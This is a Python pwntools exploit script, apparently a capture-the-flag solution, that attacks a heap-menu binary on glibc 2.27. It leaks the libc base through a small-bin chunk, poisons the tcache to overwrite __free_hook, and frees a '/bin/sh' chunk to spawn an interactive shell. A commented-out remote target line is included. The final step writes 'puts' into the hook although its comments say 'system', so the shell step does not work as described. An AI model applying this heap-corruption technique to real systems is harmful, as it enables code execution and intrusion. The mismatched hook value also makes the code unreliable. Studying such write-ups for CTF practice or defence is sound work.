from pwn import *

context.log_level = "debug"
libc = ELF("./libc-2.27.so")
# sh = process(["./ld-2.27.so", "./chall"], env={"LD_PRELOAD": "./libc-2.27.so"})
sh = process(["./ld277-3ubuntu1.so", "./chall"], env={"LD_PRELOAD": "./libc-2.27.so"})
# sh = remote("8.134.97.12", 26756)


def create(size, content):
    sh.sendafter(">>> ", "opcode: 1\npasswd: Cr4at30\n\n")
    sh.sendafter(">>> ", str(size))
    sh.sendafter(">>> ", content)


def show(idx):
    sh.sendafter(">>> ", "opcode: 2\npasswd: SH0w0\n\n")
    sh.sendafter(">>> ", str(idx))
    return sh.recvuntil('\n', drop=True)


def edit(idx, content):
    sh.sendafter(">>> ", "opcode: 3\npasswd: Ed1t0\n\n")
    sh.sendafter(">>> ", str(idx))
    sh.sendafter(">>> ", content)


def delete(idx):
    sh.sendafter(">>> ", "opcode: 4\npasswd: D3l4te0\n\n")
    sh.sendafter(">>> ", str(idx))


# === Step-1: Leak Libc using Small Bins  =========================================================
for i in range(9):  # create 0~8
    create(520, 'A')  # malloc(528uLL) chunk size=544=0x220
for i in range(7):  # delete 8~2 # full tcache(0x220) size=7
    delete(8 - i)

delete(0)  # to unsorted bin chunk*1(0x220)
delete(0)  # unsorted bin chunk(0x220, 0x200)  0x200??? some chunk take 0x20???

# malloc from tcache, tcache(0x220) size=6
create(520, b"deadbeef0000".ljust(520, b'B'))
# after: unsorted bin chunk*1(0x1e0)  small_bins[33]: chunk*1(size=0x220)


# before edit: chunk0*(deadbeef0000), 0x20chunk, 0x220chunk(in small bin), 0x20chunk .... top chunk
edit(0, b"deadbeef0000".ljust(0x240, b'B'))  # full addr bafore libc addr with 'B'
# small_bins[33]: fw=0x5555565bd230, bk=0x5555565bd230 Chunk(addr=0x5555565bd240, size=0x6161616161616160

leak_data = show(0)[0x240:]  # leak addr in libc through a chunk in small bins
libc.address = u64(leak_data.ljust(8, b'\x00')) - 0x00007f7c48fe9eb0 + 0x00007f7c48bfe000  # -0x3ebeb0
#  -(leak addr)+(libc base addr in vmmap)
print(hex(libc.address))


# === Step-2:  Cover fd of the Chunk in Tcache into`__free_hook` =================================
# recover size of chunk in small bin to 0x221 (display in heap bins is 0x220)
edit(0, b"deadbeef0000".ljust(208, b'B').ljust(0x238, b'\x00') + p64(0x221))  # 520=0x208

create(520, b"deadbeef1111".ljust(512, b'b'))  # tcache(0x220) size=5 # this chunk is in idx=0 now


delete(1)  # delete chunk(deadbeef0000) # tcache(0x220) -> chunk(deadbeef0000) -> ...
delete(0)  # delete chunk(deadbeef1111) # tcache(0x220) -> chunk(deadbeef1111) -> chunk(deadbeef0000) -> ...

create(520, b"deadbeef1111".ljust(520, b'b'))  # malloc back chunk(deadbeef1111) from tcache # idx=0
# tcache(0x220) -> chunk(deadbeef0000) -> ...
# cover the fd field of the 1st chunk(deadbeef0000) in tcache into __free_hook
edit(0, b"deadbeef1111".ljust(520, b'b').ljust(0x238, b'\x00') + p64(0x221) + p64(libc.symbols["__free_hook"]))
# tcache(0x220) -> chunk(deadbeef0000) -> __free_hook
gdb.attach(sh)  # gdb


# === Step-3: Getshell  ===========================================================================
create(520, "/bin/sh\0")  # get 1st chunk(deadbeef0000) in tcache # idx=1
# tcache(0x220) -> __free_hook
create(520, p64(libc.symbols["puts"]))  # system # get __free_hook's addr and modify __free_hook to system
# this chunk's addr is __free_hook # __free_hook's value = libc.symbols["system"]


delete(1)  # "/bin/sh\0" chunk'idx=1 # equal to call system("/bin/sh")
# trriger __free_hook: system("/bin/sh")
sh.interactive()
